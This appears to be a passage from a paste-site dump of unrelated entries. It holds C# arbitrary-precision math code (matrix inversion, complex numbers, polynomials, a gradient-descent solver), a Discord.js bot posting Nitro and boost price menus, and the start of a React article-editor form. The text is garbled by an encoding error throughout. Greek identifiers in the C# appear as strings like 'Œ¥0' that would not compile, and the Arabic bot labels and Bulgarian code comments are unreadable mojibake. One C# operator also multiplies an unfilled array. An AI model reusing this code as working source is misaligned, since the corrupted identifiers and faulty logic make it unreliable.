        for (int i = 0; i < n; i++)
          for (int j = 0; j < nn; j++)
            a[i, j] = j < n ? a0[i, j].Copy : (j == i + n ? 1 : 0);
        for (int i = 0; i < n; i++) {
          if (IsZero(a[i, i])) {
            int ii = i;
            for (int j = i + 1; j < n; j++)
              if (!IsZero(a[j, i])) { ii = j; break; }
            if (ii == i) return null;
            for (int j = i; j < nn; j++) {
              Flt tmp = a[i, j].Copy; a[i, j] = a[ii, j].Copy; a[ii, j] = tmp;
            }
          }
          Flt aii = a[i, i].Copy;
          for (int j = i; j < nn; j++) a[i, j] /= aii;
          for (int j = 0; j < n; j++)
            if (j != i) {
              Flt aji = a[j, i].Copy;
              for (int k = i; k < nn; k++)
                a[j, k] -= aji * a[i, k];
            }
        }
        Flt[,] aa = new Flt[n, n];
        for (int i = 0; i < n; i++)
          for (int j = 0; j < n; j++)
            aa[i, j] = a[i, j + n].Copy;
        return aa;
      }
      public static Flt[] Mul(Flt[,] a, Flt[] b) {
        int n = b.Length;
        Flt[] c = new Flt[n];
        for (int i = 0; i < n; i++) {
          c[i] = 0;
          for (int j = 0; j < n; j++)
            c[i] += a[i, j] * b[j];
        }
        return c;
      }
      public static Flt[] SolveLinEq(Flt[,] a, Flt[] b) {
        Flt[,] aa = Inv(a);
        if (aa == null) return null;
        return Mul(aa, b);
      }
    }
  }

  class Cplx {
    Flt x, y;
    public Flt X { get { return x.Copy; } private set { x = value.Copy; } }
    public Flt Y { get { return y.Copy; } private set { y = value.Copy; } }
    public Cplx(Flt x, Flt y) {
      this.x = x;
      this.y = y;
    }
    public Cplx(Cplx z) : this(z.x, z.y) { }
    public Cplx Copy => new Cplx(this);
    public Cplx(Flt x) : this(x, 0) { }
    public static implicit operator Cplx(Flt x) =>
    new Cplx(x);
    public Flt R2 => x.Pow(2) + y.Pow(2);
    public Flt R => R2.Root(2);
    public static Cplx Zero => (Flt)0;
    public bool IsZero => R2.exp < -(Flt.N << 32);
    public static Cplx operator -(Cplx z) => new Cplx(-z.x, -z.y);
    public static Cplx operator ~(Cplx z) => new Cplx(z.x, -z.y);
    public static Cplx operator +(Cplx z1, Cplx z2) =>
    new Cplx(z1.x + z2.x, z1.y + z2.y);
    public static Cplx operator -(Cplx z1, Cplx z2) => z1 + -z2;
    public static Cplx operator *(Cplx z1, Cplx z2) =>
    new Cplx(z1.x * z2.x - z1.y * z2.y, z1.x * z2.y + z1.y * z2.x);
    public static Cplx operator /(Cplx z, Flt a) => new Cplx(z.x / a, z.y / a);
    public static Cplx operator /(Cplx z1, Cplx z2) => z1 * ~z2 / z2.R2;
    public Cplx Pow(int n) {
      if (n < 0) return (Flt)1 / Pow(-n);
      else if (n == 0) return (Flt)1;
      else if (n == 1) return Copy;
      else {
        int m = n / 2;
        Cplx z = Pow(m);
        Cplx res = z * z;
        if ((n & 1) == 1) res *= this;
        return res;
      }
    }
    public static Cplx[] RootsOf1(int n) {
      Cplx[] z = new Cplx[n];
      Flt œÜ = M.œÄ * 2 / n;
      Cplx Œ∂ = new Cplx(M.Cos(œÜ), M.Sin(œÜ));
      for (int i = 0; i < n; i++) z[i] = Œ∂.Pow(i);
      return z;
    }
    public void Show(string name = """") {
      if (name != """") Console.WriteLine(name + "" ="");
      Console.ForegroundColor = ConsoleColor.Red;
      x.Show10();
      if (!y.IsZero) {
        Console.ForegroundColor = ConsoleColor.Cyan;
        y.Show10();
      }
      Console.ForegroundColor = ConsoleColor.White;
    }
    public class Polyn {
      Cplx[] a;
      public Cplx this[int i] { get { return a[i].Copy; } set { a[i] = value.Copy; } }
      public int L => a.Length;
      public int N => L - 1;
      public Polyn(params Cplx[] a) {
        int k = a.Length;
        for (int i = a.Length - 1; i >= 0; i--)
          if (a[i].IsZero) k--;
          else break;
        this.a = new Cplx[k];
        for (int i = 0; i < k; i++)
          this.a[i] = a[i].IsZero ? (Flt)0 : a[i].Copy;
      }
      public static Polyn operator -(Polyn p) {
        Cplx[] a = new Cplx[p.L];
        for (int i = 0; i < p.L; i++)
          a[i] = -p[i];
        return new Polyn(a);
      }

      public static Polyn operator +(Polyn p1, Polyn p2) {
        Cplx[] a = new Cplx[Math.Max(p1.L, p2.L)];
        for (int i = 0; i < a.Length; i++)
          a[i] = (i < p1.L ? p1[i] : (Flt)0) + (i < p2.L ? p2[i] : (Flt)0);
        return new Polyn(a);
      }
      public static Polyn operator -(Polyn p1, Polyn p2) => p1 + -p2;
      public static Polyn operator *(Polyn p, Cplx b) {
        Cplx[] a = new Cplx[p.L];
        for (int i = 0; i < p.L; i++) a[i] *= b;
        return new Polyn(a);
      }
      public static Polyn operator *(Cplx b, Polyn p) => p * b;
      public static Polyn operator *(Polyn p1, Polyn p2) {
        Cplx[] a = new Cplx[p1.L + p2.L - 1];
        for (int i = 0; i < a.Length; i++) a[i] = Zero;
        for (int i = 0; i < p1.L; i++)
          for (int j = 0; j < p2.L; j++) {
            a[i + j] += p1[i] * p2[j];
          }
        return new Polyn(a);
      }

    }
  }
  public static class Program {
    public const int N = 32;
    static Random rnd = new Random();
    class Pt {
      Flt x, y;
      public Flt X { get { return x; } private set { x = value.Copy; } }
      public Flt Y { get { return y; } private set { y = value.Copy; } }
      public Pt(Flt x, Flt y) { this.x = x.Copy; this.y = y.Copy; }
      public Pt Copy => new Pt(x, y);
      public static Pt operator -(Pt p) => new Pt(-p.x, -p.y);
      public static Pt operator +(Pt p1, Pt p2) => new Pt(p1.x + p2.x, p1.y + p2.y);
      public static Pt operator -(Pt p1, Pt p2) => p1 + -p2;
      public static Pt operator *(Pt p, Flt Œº) => new Pt(p.x * Œº, p.y * Œº);
      public static Pt operator *(Flt Œº, Pt p) => p * Œº;
      public static Pt operator /(Pt p, Flt Œº) => new Pt(p.x / Œº, p.y / Œº);
      public static Flt operator *(Pt p1, Pt p2) => p1.x * p2.x + p1.y * p2.y;
      public Flt R2 => this * this;
      public Flt R => R2.Root(2);
      public Pt E => this / R;
    }

    static Flt.Polyn Intpol(Pt[] p) {
      Flt.Polyn res = new Polyn(new Flt[0]);
      for (int i = 0; i < p.Length; i++) {
        Flt.Polyn q = new Flt.Polyn(new Flt[] { 1 });
        Flt Œº = 1;
        for (int j = 0; j < p.Length; j++)
          if (i != j) {
            q *= new Flt.Polyn(-p[j].X, 1);
            Œº *= p[i].X - p[j].X;
          }
        //q *= p[i].Y / Œº;
        res += q * (p[i].Y / Œº);
      }
      return res;
    }


    static Flt.Polyn Pln(Flt[] prm) {
      Flt[] q = new Flt[prm.Length + 1];
      q[0] = 0; q[1] = 0;
      for (int i = 2; i < q.Length; i++) q[i] = prm[i - 1];
      return new Flt.Polyn(q);
    }

    static Flt I(Pt[] pt, int n) {
      Flt res = 0;
      int m = (pt.Length - 1) / n;
      for (int i = 0; i < m; i++) {
        Pt[] pt0 = new Pt[n + 1];
        // Flt.Polyn p = Parab(pt0).Intg;
        for (int j = 0; j <= n; j++) pt0[j] = pt[i * n + j];
        Flt.Polyn p = Intpol(pt0).Intg;
        res += p.Value(pt0[^1].X) - p.Value(pt0[0].X);
      }
      return res;
    }


    static Flt.Polyn Pln1(Pt[] pt) {
      var f = new funcN[pt.Length - 1];
      for (int i = 0; i < f.Length; i++) {
        int j = i;
        f[j] = t => {
          var a = new Flt[pt.Length + 1];
          a[0] = pt[0].Y.Copy;
          a[1] = 0;
          for (int k = 2; k < a.Length; k++)
            a[k] = t[k - 2].Copy;
          var pln = new Flt.Polyn(a);
          return pln.Value(pt[j + 1].X) - pt[j + 1].Y;
        };
      }
      var a0 = new Flt[f.Length];
      for (int i = 0; i < a0.Length; i++) a0[i] = 0;
      var a1 = Equations.Solve(f, a0);
      //Console.WriiteLine(""OK"");
      //Console.ReadLine();
      var aa = new Flt[a1.Length + 2];
      aa[0] = pt[0].Y.Copy; aa[1] = 0;
      for (int i = 2; i < aa.Length; i++) aa[i] = a1[i - 2].Copy;
      return new Flt.Polyn(aa);
    }


    public static void Main() {
      int prec = 50;
      void Show(Flt x, string name = """") =>
       x.Show10Round(prec, name);


      {
        Flt g(Flt[] a) {
          Flt res = 1;
          for (int i = a.Length - 1; i >= 0; i--)
            res = M.Pow(a[i], res);
          return res;
        }

        int nt = 9;
        Flt r0 = 2;
        var ft0 = new funcN[nt];
        var ft = new funcN[nt];
        for (int i = 0; i < ft.Length; i++) {
          int j = i;
          ft0[j] = t => {
            var x = new Flt[ft.Length];
            for (int k = 0; k < x.Length; k++) {
              x[k] = t[(j + k) % x.Length];
            }
            return g(x);
          };
          ft[j] = t => ft0[j](t) - (r0 + j);
        }
        /*
        Flt R(Flt[] t) {
          Flt res = 0;
          for (int i = 0; i < ft.Length; i++)
            res += ft[i](t).Pow(2);
          return res;
        }*/
        Flt R(Flt[] t) {
          Flt res = 0;
          for (int i = 0; i < ft.Length; i++) {
            var s = ft0[i](t) / (r0 + i);
            res += (s - 1).Pow(2) + (1 / s - 1).Pow(2);
          }
          return res;
        }
        /*
        var q0 = new Flt[] { 1.2, 1.2, 1.2,
        1.2, 1.2, 1.2,
        1.2, 1.2, 1.2 };
        */
        var q0 = new Flt[nt];
        /*
        for (int i = 0; i < nt; i++)
          q0[i] = 1.3;
        */
        string path = ""q2.txt"";
        if (File.Exists(path)) {
          var str = File.ReadAllLines(path);
          for (int i = 0; i < q0.Length; i++)
            q0[i] = (Flt)str[i];

        } else {
          q0[0] =
           (Flt)""1.306026805891242807652545950399"";
          q0[1] =
           (Flt)""1.422496123930371511508945347115"";
          q0[2] =
           (Flt)""1.481968384211597922114406899939"";
          q0[3] =
           (Flt)""1.517880134636269721047143119619"";
          q0[4] =
           (Flt)""1.537379894011106094871255325070"";
          q0[5] =
           (Flt)""1.428813343342501327902427160487"";
          q0[6] =
           (Flt)""1.298260843634120034650137509060"";
          q0[7] =
           (Flt)""1.251605981176236997085156615874"";
          q0[8] =
           (Flt)""3.351161933057958748208486588071"";
        }
        var t = Equations.Solve(ft, q0);
        //Flt.ShowArray(t, 30, ""solution"");
        var res1 = new Flt[ft.Length];
        for (int i = 0; i < ft.Length; i++)
          res1[i] = ft[i](t) + r0 + i;
        Flt.ShowArray(t, 60, ""q0"", ConsoleColor.Yellow);
        Flt.ShowArray(res1, 60, ""f"", ConsoleColor.Cyan);
        return;
        //Console.WriteLine(""Start"");
        Flt Œ¥0 = R(q0);
        //Console.WriteLine(""Œ¥0 OK"");
        Flt hmax = 0.0005;
        Flt h = 0.00025;
        int cnt = 0;
        while (Œ¥0 > ((Flt)10).Pow(-50)) {
          //Show(h);
          var grd = Equations.Grad(R, q0);
          var qt = new Flt[grd.Length];
          for (int i = 0; i < grd.Length; i++)
            qt[i] = q0[i] - grd[i] * h;
          var Œ¥t = R(qt);
          if (Œ¥t < Œ¥0) {
            q0 = Flt.CopyArr(qt);
            Œ¥0 = Œ¥t.Copy;
            cnt++;

            Console.Clear();

            Show(h);
            var res = new Flt[ft.Length];
            for (int i = 0; i < ft.Length; i++)
              res[i] = ft[i](q0) + r0 + i;

            Flt.ShowArray(q0, prec, ""q0"", ConsoleColor.Yellow);
            Flt.ShowArray(res, prec, ""f"", ConsoleColor.Cyan);
            Show(Œ¥0);
            if (cnt == 5) {
              var str = new string[q0.Length];
              for (int i = 0; i < q0.Length; i++)
                str[i] = q0[i].Str10;
              File.WriteAllLines(path, str);
              Console.WriteLine(""Saved"");
              if (h < hmax) h *= 1.25;
              cnt = 0;
            }
          } else {
            h *= 0.7;
            Console.ForegroundColor = ConsoleColor.Red;
            Show(h);
            Console.ForegroundColor = ConsoleColor.White;

            cnt = 0;
          }
        }
      }
      /*
            //Polyn p = new Polyn(1, 2, 3);
            func F0 = x => x * (x - 1) + 1;
            //func F0 = M.Exp;
            Flt FPln(Flt x, Flt[] q, Flt a) {
              Flt xx = (x - a).Pow(2);
              Flt res = 0;
              for (int i = q.Length - 1; i >= 0; i--) {
                res *= xx;
                res += q[i];
              }
              return res;
            }

            Flt x1 = -0.1, x2 = 1.1;
            Flt xm = (x1 + x2) / 2;
            int n = 13;
            Flt Œî(int i, Flt[] q, Flt x1, Flt x2) {
              //Flt x = x1 + (x2 - x1) * i / (q.Length - 1);
              Flt x = xm + (x2 - xm) * i / (q.Length - 1);
              //var pln = new Polyn(q);
              //return pln.Value(pln.Value(x)) - F0(x);
              return FPln(FPln(x, q, 0.5), q, 0.5) - F0(x);
            }
            var f = new funcN[n];
            for (int i = 0; i < n; i++) {
              int j = i;
              f[j] = q => Œî(j, q, x1, x2);
            }

            funcN R = q => {
              Flt r = 0;
              for (int i = 0; i < q.Length; i++) {
                Flt Œ¥ = Œî(i, q, x1, x2);
                r += Œ¥ * Œ¥;
              }
              return r;
            };
            var q0 = new Flt[n];
            for (int i = 0; i < n; i++) q0[i] = 0;
            q0[0] = 0.69; q0[1] = 1.78; q0[2] = -5.9;
            var q = Equations.Solve(f, q0);
            for (int i = 0; i < q.Length; i++) {
              Show(q[i], i.ToString());
            }
            Console.WriteLine();
            //var pln = new Polyn(q);
            Flt dx = (x2 - xm) / (2 * (n - 1));
            for (int i = 0; i <= 2 * (n - 1); i++) {
              var x = xm + dx * i;
              Show(x);
              //Show(pln.Value(x));
              Show(FPln(x, q, 0.5));
              Show(FPln(FPln(x, q, 0.5), q, 0.5));
              //var t = pln.Value(pln.Value(x)) / F0(x);
              var t = FPln(FPln(x, q, 0.5), q, 0.5) / F0(x);
              Show(t);
              Console.WriteLine();
            }
            return;
            */


    }

  }
}"
taqAsEJb,Bigo,BETAlwrd,JavaScript,Monday 9th of June 2025 10:40:46 AM CDT,"const {Client} = require('discord.js');
const bigo_bot=new Client({intents: [1, 512, 32768]});
const bigo_tok="""";
const bigo_cha_1_nitro="""";
const bigo_cha_2_boost="""";
bigo_bot.on('ready', async () => {


    const bigo_emb = {
        title: 'ÿßÿÆÿ™ÿ± ŸÖŸÜ ÿßŸÑŸÇÿßÿ¶ŸÖÿ©:',
        image: {
            url: 'https://media.discordapp.net/attachments/1376436257277743104/1381647964023291985/Screenshot_2.png'
        },
        color: 0x000000
    };

    const bigo_row_1 = {
        type: 3,
        custom_id: 'options_menu',
        placeholder: 'ÿßÿÆÿ™ÿ± ŸÑŸÖÿπÿ±ŸÅÿ© ÿßŸÑÿ≥ÿπÿ±',
        options: [
            {
                label: 'ŸÜŸÄŸäŸÄÿ™ŸÄÿ±Ÿà ŸÇŸÄŸäŸÄŸÖŸÄŸÜŸÄŸÇ',
                description: 'ÿßÿ∂ÿ∫ÿ∑ ŸÑŸÖÿπÿ±ŸÅÿ© ÿßÿ≥ÿπÿßÿ± ÿßŸÑŸÜŸäÿ™ÿ±ŸàŸáÿßÿ™',
                value: 'bigo_nitr'
            }
        ]
    };
    const bigo_row_2 = {
        type: 3,
        custom_id: 'options_menu',
        placeholder: 'ÿßÿÆÿ™ÿ± ŸÑŸÖÿπÿ±ŸÅÿ© ÿßŸÑÿ≥ÿπÿ±',
        options: [
            {
                label: 'ÿ≥ŸÄŸäŸÄÿ±ŸÅŸÄŸÄÿ± ÿ®ŸÄŸàÿ≥ŸÄÿ™',
                description: 'ÿßÿ∂ÿ∫ÿ∑ ŸÑŸÖÿπÿ±ŸÅÿ© ÿßÿ≥ÿπÿßÿ± ÿßŸÑÿ®Ÿàÿ≥ÿ™ÿßÿ™',
                value: 'bigo_boss'
            }
        ]
    };

    const bigo_row_nitro_1 = {
        type: 1,
        components: [bigo_row_1]
    };
    const bigo_row_boost_2 = {
        type: 1,
        components: [bigo_row_2]
    };



(await bigo_bot.channels.fetch(bigo_cha_1_nitro))?.send({embeds: [bigo_emb],components: [bigo_row_nitro_1]}).catch(() => console.error(""room id plz""));  
(await bigo_bot.channels.fetch(bigo_cha_2_boost))?.send({embeds: [bigo_emb],components: [bigo_row_boost_2]}).catch(() => console.error(""room id plz""));  

});

bigo_bot.on('interactionCreate', async (interaction) => {
    if (!interaction.isStringSelectMenu()) return;
    if (interaction.customId !== 'options_menu') return;
    let bigo_emb_1;
    switch (interaction.values[0]) {
        case 'bigo_nitr':
            bigo_emb_1 = {
                title: 'ŸÜŸÄŸäŸÄÿ™ŸÄÿ±Ÿà ŸÇŸÄŸäŸÄŸÖŸÄŸÜŸÄŸÇ',
                description: 'ÿ¥Ÿáÿ± ŸÇŸäŸÅÿ™: xx$\nÿ≥ŸÜŸá ŸÇŸäŸÅÿ™: xx$',
                image: {
                    url: 'https://media.discordapp.net/attachments/1376436257277743104/1381647964023291985/Screenshot_2.png'
                },
                color: 0x000000
            };
            break;

        case 'bigo_boss':
            bigo_emb_1 = {
                title: 'ÿ≥ŸÄŸäŸÄÿ±ŸÅŸÄŸÄÿ± ÿ®ŸÄŸàÿ≥ŸÄÿ™',
                description: '14 ÿ®Ÿàÿ≥ÿ™ ÿ¥Ÿáÿ±: xx$\n14 ÿ®Ÿàÿ≥ÿ™ 3 ÿ¥ŸáŸàÿ±: xx$',
                image: {
                    url: 'https://media.discordapp.net/attachments/1376436257277743104/1381647964023291985/Screenshot_2.png'
                },
                color: 0x000000
            };
            break;
    }

    await interaction.reply({
        embeds: [bigo_emb_1],
        ephemeral: true
    });
});

bigo_bot.login(bigo_tok).then(() => console.log(""BIGO -""+bigo_bot.user.tag)).catch(e => console.error(e));"
gjHzbGbk,Untitled,bebo231312312321,JavaScript,Monday 9th of June 2025 10:39:22 AM CDT,"
import React, { useState, useRef, useMemo, useEffect, useReducer, forwardRef, useImperativeHandle } from ""react"";
import { FontAwesomeIcon } from ""@fortawesome/react-fontawesome"";
import {
    faPlus, faMinus, faImage, faVideo, faSliders,
    faUpload, faEye, faSave, faTimes, faCloudUploadAlt,
    faEdit
} from ""@fortawesome/free-solid-svg-icons"";
import { useTranslation } from ""react-i18next"";
import ""./articleCreateForm.css"";
import { Editor } from 'react-draft-wysiwyg';
import 'react-draft-wysiwyg/dist/react-draft-wysiwyg.css';
import { useArticleContext } from ""../../contexts/ArticleContext"";
import { createEditorState } from ""../articleUtils/editor"";
import ScrollToTop from ""../../ScrollToTop/ScrollToTop"";
import { ImageAltEditModal } from ""../ArticleCreateForm/ImageAltEditModal/ImageAltEditModal"";
import VideoThumbnailGenerator from ""../ArticleCreateForm/VideoThumbnailGenerator/VideoThumbnailGenerator"";
import { SectionQuickMenu } from ""../ArticleCreateForm/SectionQuickMenu/SectionQuickMenu"";
import ArticlePreview from ""./ArticlePreview/ArticlePreview"";
import { useCreateArticle } from ""../../hooks/useCreateArticle"";
import VideoPlayer from ""../ArticleView/VideoPlayer/VideoPlayer"";

const ArticleCreateForm = forwardRef(({ initialValues: propInitialValues, onSubmitHandler, isEditMode }, ref) => {
    const { t, i18n } = useTranslation();
    const { createArticle } = useArticleContext();
    const [previewMode, setPreviewMode] = useState(false);
    const [isAltModalOpen, setIsAltModalOpen] = useState(false);
    const [activeSection, setActiveSection] = useState(null);
    const [currentEditingImage, setCurrentEditingImage] = useState({
        sectionIndex: null,
        imageIndex: null,
        image: null
    });

    // –ò–∑–ø–æ–ª–∑–≤–∞–º–µ propInitialValues (–∞–∫–æ –∏–º–∞ —Ç–∞–∫–∏–≤–∞) –∏–ª–∏ –¥–µ—Ñ–æ–ª—Ç–Ω–∏—Ç–µ —Å—Ç–æ–π–Ω–æ—Å—Ç–∏
    const defaultValues = {
        title: """",
        slug: """",
        author: """",
        publishDate: new Date().toISOString().split('T')[0],
        summary: createEditorState(),
        mainImage: {
            type: ""image"",
            sources: [],
            alt: createEditorState(),
            thumbnail: """",
            videoUrl: """",
            subtitles: [],
            allowDownload: false,
        },
        sections: [
            {
                title: """",
                content: createEditorState(),
                image: [],
                order: 1,
            },
        ],
        tags: [],
        previousArticle: null,
        nextArticle: null,
    };

    // –ò–∑–ø–æ–ª–∑–≤–∞–º–µ –ø—Ä–æ–ø–Ω–∞—Ç–∏—Ç–µ —Å—Ç–æ–π–Ω–æ—Å—Ç–∏, –∞–∫–æ –∏–º–∞ —Ç–∞–∫–∏–≤–∞
    const actualInitialValues = propInitialValues || defaultValues;

    // –û–ø—Ä–µ–¥–µ–ª—è–º–µ –ø—Ä–∞–≤–∏–ª–Ω–∏—è onSubmitHandler
    const submitHandler = onSubmitHandler || createArticle;

    // –ü–æ–¥–≥–æ—Ç–≤—è–º–µ –Ω–∞—á–∞–ª–Ω–∏—Ç–µ mediaFiles —Å–ø–æ—Ä–µ–¥ –Ω–∞–ª–∏—á–Ω–∏—Ç–µ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏—è –æ—Ç initialValues
    const preparedMediaFiles = useMemo(() => {
        const mediaFiles = {
            mainImage: [],
            sectionImages: {}
        };

        // –ê–∫–æ —Ä–µ–¥–∞–∫—Ç–∏—Ä–∞–º–µ —Å—Ç–∞—Ç–∏—è —Å—ä—Å —Å—ä—â–µ—Å—Ç–≤—É–≤–∞—â–∏ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏—è –≤ —Å–µ–∫—Ü–∏–∏—Ç–µ
        if (actualInitialValues && actualInitialValues.sections) {
            actualInitialValues.sections.forEach((section, index) => {
                if (Array.isArray(section.image) && section.image.length > 0) {
                    // –ò–º–∞–º–µ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏—è –≤ —Ç–∞–∑–∏ —Å–µ–∫—Ü–∏—è - –¥–æ–±–∞–≤—è–º–µ –ø—Ä–∞–∑–µ–Ω –º–∞—Å–∏–≤
                    // –¢–æ–≤–∞ —â–µ –Ω–∏ –ø–æ–º–æ–≥–Ω–µ –¥–∞ –∑–Ω–∞–µ–º, —á–µ —Å–µ–∫—Ü–∏—è—Ç–∞ –∏–º–∞ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏—è
                    mediaFiles.sectionImages[index] = [];
                }
            });
        }

        return mediaFiles;
    }, []);

    const {
        values,
        errors,
        isUploading,
        uploadProgress,
        onChangeHandler,
        onBlurHandler,
        onSubmit,
        handleMainImageTypeChange,
        handleMainImageFiles,
        handleSectionImageFile,
        handleMainImageUrl,
        handleSectionImageUrl,
        removeUrlImage,
        removeMainImage,
        removeSectionImage,
        addSection,
        removeSection,
        swapSectionsMedia,
        addTag,
        updateImageInfo,
        removeTag,
        mediaFiles,
        convertEditorToHtml,
        uploadThumbnailFile,
        updateImageAlt,
    } = useCreateArticle(actualInitialValues, submitHandler);

    useImperativeHandle(ref, () => ({
        onSubmit,
        mediaFiles,
        values
    }));

    const [newTag, setNewTag] = useState("""");
    const [, forceUpdate] = useReducer(x => x + 1, 0);
    const [imageUrl, setImageUrl] = useState("""");
    const [sectionImageUrls, setSectionImageUrls] = useState({});

    const videoUrlInputRef = useRef(null);

    const videoPreviewUrl = useMemo(() => {
        if (mediaFiles.mainImage && mediaFiles.mainImage.length > 0 && mediaFiles.mainImage[0]) {
            try {
                return URL.createObjectURL(mediaFiles.mainImage[0]);
            } catch (error) {
                console.error(""Error creating URL:"", error);
                return null;
            }
        }
        return null;
    }, [mediaFiles.mainImage]);

    const handleAddImageUrl = () => {
        if (handleMainImageUrl(imageUrl)) {
            setImageUrl("""");
        }
    };

    const openAltEditModal = (sectionIndex, imageIndex, image) => {
        // –ö–æ–ø–∏—Ä–∞–º–µ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–µ—Ç–æ –∑–∞ –¥–∞ –∏–∑–±–µ–≥–Ω–µ–º –ø—Ä–æ–±–ª–µ–º–∏ —Å —Ä–µ—Ñ–µ—Ä–µ–Ω—Ü–∏–∏
        setCurrentEditingImage({
            sectionIndex,
            imageIndex,
            image: { ...image }
        });
        setIsAltModalOpen(true);
    };

    // –§—É–Ω–∫—Ü–∏—è –∑–∞ –∑–∞–ø–∞–∑–≤–∞–Ω–µ –Ω–∞ –ø—Ä–æ–º–µ–Ω–∏—Ç–µ –≤ ALT —Ç–µ–∫—Å—Ç–∞
    const handleSaveImageInfo = (altEditorState, captionEditorState) => {
        const { sectionIndex, imageIndex } = currentEditingImage;
        updateImageInfo(sectionIndex, imageIndex, altEditorState, captionEditorState);
    };

    // –ö–µ—à–∏—Ä–∞–Ω–µ –Ω–∞ blob URL-–∏ –∑–∞ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏—è –≤ —Å–ª–∞–π–¥–µ—Ä–∞
    const mainImagePreviewUrls = useMemo(() => {
        if (mediaFiles.mainImage && mediaFiles.mainImage.length > 0) {
            return mediaFiles.mainImage.map(file => {
                try {
                    return URL.createObjectURL(file);
                } catch (error) {
                    console.error(""Error creating URL:"", error);
                    return null;
                }
            });
        }
        return [];
    }, [mediaFiles.mainImage]);

    // –ö–µ—à–∏—Ä–∞–Ω–µ –Ω–∞ blob URL-–∏ –∑–∞ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏—è –≤ —Å–µ–∫—Ü–∏–∏—Ç–µ
    const sectionImagePreviewUrls = useMemo(() => {
        const urls = {};

        // 1. –û–±—Ä–∞–±–æ—Ç–∫–∞ –Ω–∞ —Ñ–∞–π–ª–æ–≤–µ –æ—Ç mediaFiles.sectionImages
        if (mediaFiles.sectionImages) {
            Object.entries(mediaFiles.sectionImages).forEach(([index, file]) => {
                try {
                    if (Array.isArray(file) && file.length > 0 &&
                        (file[0] instanceof Blob || file[0] instanceof File)) {
                        urls[index] = URL.createObjectURL(file[0]);
                    } else if (file && (file instanceof Blob || file instanceof File)) {
                        urls[index] = URL.createObjectURL(file);
                    }
                } catch (error) {
                    console.error(""Error creating URL for section image:"", error);
                    urls[index] = null;
                }
            });
        }

        return urls;
    }, [mediaFiles.sectionImages]);

    // –í–ê–ñ–ù–û: –ü–æ—á–∏—Å—Ç–≤–∞–Ω–µ –Ω–∞ blob URL-–∏ –ø—Ä–∏ —Ä–∞–∑–º–æ–Ω—Ç–∏—Ä–∞–Ω–µ –Ω–∞ –∫–æ–º–ø–æ–Ω–µ–Ω—Ç–∞
    useEffect(() => {
        return () => {
            // –û—Å–≤–æ–±–æ–∂–¥–∞–≤–∞–Ω–µ –Ω–∞ –≤–∏–¥–µ–æ URL
            if (videoPreviewUrl) {
                URL.revokeObjectURL(videoPreviewUrl);
            }

            // –û—Å–≤–æ–±–æ–∂–¥–∞–≤–∞–Ω–µ –Ω–∞ URL-–∏ –Ω–∞ –æ—Å–Ω–æ–≤–Ω–∏ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏—è
            mainImagePreviewUrls.forEach(url => {
                if (url) URL.revokeObjectURL(url);
            });

            // –û—Å–≤–æ–±–æ–∂–¥–∞–≤–∞–Ω–µ –Ω–∞ URL-–∏ –Ω–∞ —Å–µ–∫—Ü–∏–æ–Ω–Ω–∏ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏—è
            Object.values(sectionImagePreviewUrls).forEach(url => {
                if (url) URL.revokeObjectURL(url);
            });
        };
    }, [videoPreviewUrl, mainImagePreviewUrls, sectionImagePreviewUrls]);

    const handleEditorChange = (editorState, name) => {
        onChangeHandler(null, true, { name, value: editorState });
    };

    const handleEditorBlur = (name, editorState) => {
        onBlurHandler(null, true, { name, value: editorState });
    };

    const moveSectionUp = (index) => {
        if (index <= 0) return;

        // –°—ä–∑–¥–∞–≤–∞–º–µ –Ω–æ–≤–æ –∫–æ–ø–∏–µ –Ω–∞ –º–∞—Å–∏–≤–∞ —Å—ä—Å —Å–µ–∫—Ü–∏–∏
        const updatedSections = [...values.sections];

        // –ó–∞–ø–∞–∑–≤–∞–º–µ —Ç–µ–∫—É—â–∞—Ç–∞ —Å–µ–∫—Ü–∏—è –∏ —Ç–∞–∑–∏ –Ω–∞–¥ –Ω–µ—è
        const currentSection = { ...updatedSections[index] };
        const prevSection = { ...updatedSections[index - 1] };

        // –†–∞–∑–º–µ–Ω—è–º–µ –≥–∏
        updatedSections[index - 1] = currentSection;
        updatedSections[index] = prevSection;

        // –ê–∫—Ç—É–∞–ª–∏–∑–∏—Ä–∞–º–µ order —Å–≤–æ–π—Å—Ç–≤–æ—Ç–æ
        updatedSections.forEach((section, idx) => {
            section.order = idx + 1;
        });

        // –ü—Ä–∞–≤–∏–º –¥–∏—Ä–µ–∫—Ç–µ–Ω update –Ω–∞ —Å–µ–∫—Ü–∏–∏—Ç–µ –≤ —Å—Ç–µ–π—Ç–∞
        onChangeHandler(null, true, { name: ""sections"", value: updatedSections });

        // –í–ê–ñ–ù–û! –†–∞–∑–º–µ–Ω—è–º–µ –º–µ–¥–∏—è —Ñ–∞–π–ª–æ–≤–µ—Ç–µ —Å—ä—â–æ
        swapSectionsMedia(index, index - 1);

        // –ê–∫—Ç—É–∞–ª–∏–∑–∏—Ä–∞–º–µ –∞–∫—Ç–∏–≤–Ω–∞—Ç–∞ —Å–µ–∫—Ü–∏—è
        setActiveSection(index - 1);
    };

    const moveSectionDown = (index) => {
        if (index >= values.sections.length - 1) return;

        // –°—ä–∑–¥–∞–≤–∞–º–µ –Ω–æ–≤–æ –∫–æ–ø–∏–µ –Ω–∞ –º–∞—Å–∏–≤–∞ —Å—ä—Å —Å–µ–∫—Ü–∏–∏
        const updatedSections = [...values.sections];

        // –ó–∞–ø–∞–∑–≤–∞–º–µ —Ç–µ–∫—É—â–∞—Ç–∞ —Å–µ–∫—Ü–∏—è –∏ —Ç–∞–∑–∏ –ø–æ–¥ –Ω–µ—è
        const currentSection = { ...updatedSections[index] };
        const nextSection = { ...updatedSections[index + 1] };

        // –†–∞–∑–º–µ–Ω—è–º–µ –≥–∏
        updatedSections[index + 1] = currentSection;
        updatedSections[index] = nextSection;

        // –ê–∫—Ç—É–∞–ª–∏–∑–∏—Ä–∞–º–µ order —Å–≤–æ–π—Å—Ç–≤–æ—Ç–æ
        updatedSections.forEach((section, idx) => {
            section.order = idx + 1;
        });

